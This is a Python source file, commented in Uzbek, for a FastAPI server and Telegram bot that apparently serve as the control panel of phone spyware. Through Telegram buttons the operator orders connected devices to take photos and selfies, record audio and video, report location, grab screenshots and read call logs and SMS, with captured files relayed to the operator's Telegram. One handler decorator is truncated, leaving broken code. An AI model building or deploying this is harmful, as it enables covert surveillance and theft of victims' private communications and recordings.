import asyncio
import os
import logging
import traceback
from contextlib import asynccontextmanager
from typing import Set

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, File, BackgroundTasks, Form
from fastapi.responses import JSONResponse
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import FSInputFile, ReplyKeyboardMarkup, KeyboardButton

from dotenv import load_dotenv
load_dotenv()

# ─── LOGGING SOZLASH ──────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("bot")

# ─── SOZLAMALAR ───────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID  = int(os.getenv("ADMIN_ID", "0"))

log.info("=" * 50)
log.info(f"BOT_TOKEN: {'OK' if BOT_TOKEN else 'YOQ !!!'}")
log.info(f"ADMIN_ID:  {ADMIN_ID if ADMIN_ID else 'YOQ !!!'}")
log.info("=" * 50)

# ─── GLOBAL HOLAT ─────────────────────────────────────────────────────────────
from aiogram.client.session.aiohttp import AiohttpSession

connected_devices: Set[WebSocket] = set()

# Timeout ni 120 soniyaga uzaytiramiz (katta fayllar uchun)
session = AiohttpSession(timeout=120)
bot = Bot(token=BOT_TOKEN, session=session)
dp  = Dispatcher()


def get_main_keyboard():
    kb = [
        [KeyboardButton(text="📸 Rasm olish"), KeyboardButton(text="🤳 Selfie")],
        [KeyboardButton(text="🎙 Ovoz yozish (10 sek)"), KeyboardButton(text="🎥 1 Daqiqalik Video")],
        [KeyboardButton(text="📍 Manzilni aniqlash")],
        [KeyboardButton(text="📸 Ekran rasmi")],
        [KeyboardButton(text="🔋 Batareya"), KeyboardButton(text="📱 Qurilma info")],
        [KeyboardButton(text="📞 Qo'ng'iroqlar"), KeyboardButton(text="💬 SMS O'qish")],
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)


# ─── BOT HANDLERLAR ────────────────────────────────────────────────────────────
@dp.message(Command("start"))
async def start_handler(message: types.Message):
    log.info(f"/start → user_id={message.from_user.id}, admin_id={ADMIN_ID}")
    if message.from_user.id != ADMIN_ID:
        log.warning(f"Notanish foydalanuvchi: {message.from_user.id}")
        return
    devices_count = len(connected_devices)
    log.info(f"Admin kirdi. Ulangan qurilmalar: {devices_count}")
    await message.answer(
        f"Kuzatuv tizimi faol!\nUlangan qurilmalar: {devices_count} ta\n\nQuyidagi tugmalardan birini tanlang:",
        reply_markup=get_main_keyboard()
    )


    "📸 Rasm olish", "🤳 Selfie",
    "🎙 Ovoz yozish (10 sek)", "🎥 1 Daqiqalik Video",
    "📍 Manzilni aniqlash", "📸 Ekran rasmi",
    "🔋 Batareya", "📱 Qurilma info",
    "📞 Qo'ng'iroqlar", "💬 SMS O'qish"
}))
async def action_handler(message: types.Message):
    global connected_devices
    if message.from_user.id != ADMIN_ID:
        return

    log.info(f"Buyruq: '{message.text}' | Ulangan qurilmalar: {len(connected_devices)}")

    if not connected_devices:
        log.warning("Qurilma yo'q — buyruq yuborilmadi")
        await message.answer("⚠️ Diqqat: Qurilma hozir tarmoqda emas.")
        return

    command_map = {
        "📸 Rasm olish":        "take_photo",
        "🤳 Selfie":            "selfie",
        "🎙 Ovoz yozish (10 sek)": "record_audio",
        "🎥 1 Daqiqalik Video": "record_video",
        "📍 Manzilni aniqlash":   "get_location",
        "📸 Ekran rasmi":       "get_screenshot",
        "🔋 Batareya":          "battery",
        "📱 Qurilma info":      "device_info",
        "📞 Qo'ng'iroqlar":     "get_call_logs",
        "💬 SMS O'qish":        "get_sms_logs",
    }
    action = command_map[message.text]

    disconnected = set()
    sent = 0
    for device in set(connected_devices):
        try:
            await device.send_text(action)
            sent += 1
            log.info(f"'{action}' yuborildi → qurilma #{sent}")
        except Exception as e:
            log.error(f"Qurilmaga yuborishda xatolik: {e}")
            disconnected.add(device)
    connected_devices -= disconnected

    await message.answer(f"⏳ Buyruq yuborildi: {message.text} ({sent} qurilma)")


# ─── FASTAPI ──────────────────────────────────────────────────────────────────
@asynccontextmanager
async def lifespan(app: FastAPI):
    log.info("FastAPI ishga tushdi. Bot polling boshlanmoqda...")
    polling_task = asyncio.create_task(dp.start_polling(bot))
    yield
    polling_task.cancel()
    await bot.session.close()
    log.info("FastAPI to'xtadi.")

app = FastAPI(lifespan=lifespan)


@app.websocket("/ws/device")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    connected_devices.add(websocket)
    client = websocket.client
    log.info(f"Yangi qurilma ulandi: {client} | Jami: {len(connected_devices)} ta")
    try:
        while True:
            data = await websocket.receive_text()
            log.info(f"Qurilmadan xabar: {data[:80]}")
    except WebSocketDisconnect:
        connected_devices.discard(websocket)
        log.info(f"Qurilma uzildi: {client} | Qolganlar: {len(connected_devices)} ta")
    except Exception as e:
        connected_devices.discard(websocket)
        log.error(f"WebSocket xatolik: {e}")


async def send_media_to_admin(file_path: str, media_type: str):
    log.info(f"Telegramga yuborilmoqda: {media_type} | Fayl: {file_path}")
    try:
        if not os.path.exists(file_path):
            log.error(f"Fayl topilmadi: {file_path}")
            return
        size = os.path.getsize(file_path)
        log.info(f"Fayl hajmi: {size} bayt")
        if size < 10:
            log.error(f"Fayl juda kichik ({size} bayt) — yuborilmadi")
            return

        media = FSInputFile(file_path)
        if media_type == "photo":
            await bot.send_photo(chat_id=ADMIN_ID, photo=media, caption="📸 Kamera surati")
            log.info("Rasm Telegramga yuborildi ✅")
        elif media_type == "audio":
            await bot.send_voice(chat_id=ADMIN_ID, voice=media, caption="🎙 Ovozli yozuv")
            log.info("Audio Telegramga yuborildi ✅")
        elif media_type == "video":
            await bot.send_video(chat_id=ADMIN_ID, video=media, caption="🎥 Video")
            log.info("Video Telegramga yuborildi ✅")
    except Exception as e:
        log.error(f"Telegramga yuborishda XATOLIK: {e}")
        log.error(traceback.format_exc())
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)
            log.info(f"Vaqtinchalik fayl o'chirildi: {file_path}")


async def send_text_to_admin(text: str):
    log.info(f"Matn yuborilmoqda: {text[:80]}")
    try:
        await bot.send_message(chat_id=ADMIN_ID, text=text)
        log.info("Matn Telegramga yuborildi ✅")
    except Exception as e:
        log.error(f"Matn yuborishda XATOLIK: {e}")


@app.post("/upload")
async def upload_media(
    background_tasks: BackgroundTasks,
    media_type: str = Form(...),
    file: UploadFile = File(None),
    text: str = Form(None)
):
    log.info(f"/upload keldi → media_type='{media_type}', file={file.filename if file else None}, text={str(text)[:50] if text else None}")
    try:
        if media_type == "text" and text:
            background_tasks.add_task(send_text_to_admin, text)
        elif file:
            file_location = f"temp_{file.filename}"
            content = await file.read()
            log.info(f"Fayl qabul qilindi: {len(content)} bayt")
            with open(file_location, "wb") as f:
                f.write(content)
            background_tasks.add_task(send_media_to_admin, file_location, media_type)
        else:
            log.warning("Upload: fayl ham, matn ham yo'q!")
            return JSONResponse(content={"status": "empty"})

        return JSONResponse(content={"status": "success"})
    except Exception as e:
        log.error(f"/upload xatolik: {e}")
        log.error(traceback.format_exc())
        return JSONResponse(content={"status": "error", "detail": str(e)}, status_code=500)


@app.get("/")
async def root():
    return JSONResponse(content={"status": "ok", "message": "Bot is running on Render!"})

@app.get("/health")
async def health_check():
    return JSONResponse(content={"status": "ok"})


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=8000,
        reload=True,
        reload_excludes=["client/*", "client/**/*", "*.spec", "*.bat"]
    )
